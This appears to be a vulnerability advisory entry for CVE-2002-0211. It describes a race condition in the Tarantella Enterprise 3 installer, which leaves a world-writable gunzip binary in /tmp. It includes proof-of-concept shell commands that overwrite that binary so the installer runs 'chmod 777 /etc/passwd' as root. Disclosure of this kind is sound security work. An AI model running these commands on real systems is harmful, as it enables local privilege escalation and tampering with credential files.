   Description: Tarantella, a supplier of Internet infrastructure
   software, has released Tarantella Enterprise 3, version 3.2, positioned
   as a managed, secure application access product that provides
   authorization, authentication, and accountability for enterprise
   systems. The software supplies integrated, managed, and secure access
   to server-based applications through a Web browser. This iteration of
   the Tarantella software focuses on security, performance, and network
   optimization while allowing fast and simple integration with existing
   corporate infrastructures.
   Vulnerability:
   The installation script provided with tarentella handles utility
   packages during installation insecurely. A root owned binary "gunzip"
   is created in /tmp with world writeable permissions, the pid is
   appended to the filename. TMP_GUNZIP=$TMPDIR/gunzip$$ $ ls -l
   /tmp/gunzip16152 --rwxrwxrwx 1 root root 51808 Jan 14 00:15 gunzip16152
   gunzip is extracted: extract gunzip > "$TMP_GUNZIP" 2>>$SHXLOGFILE
   extract gunzip | uncompress > "$TMP_GUNZIP" 2>>$SHXLOGFILE The
   permissions of gunzip are changed to rwx for all: chmod 777 $TMP_GUNZIP
   >/dev/null 2>&1 The binary is used during installation: extract
   $efilename | $TMP_GUNZIP -q > "$efilename"
   CVE-2002-0211
   JSON: Export
   Exploit Code:

    1. There is a race condition between when gunzip is extracted and used
       during installation. At which time a malicious local user could
       inject code to compromise the system quickly.
    2.
    3. $ echo "#!/bin/sh" > /tmp/test.sh
    4. $ echo "chmod 777 /etc/passwd" >> /tmp/test.sh
    5.
    6. $ cat /tmp/test.sh > /tmp/gunzip16152
    7.
    8. I was able to change the permissions of /etc/passwd to 777 by
       performing the above as an non administrative user.
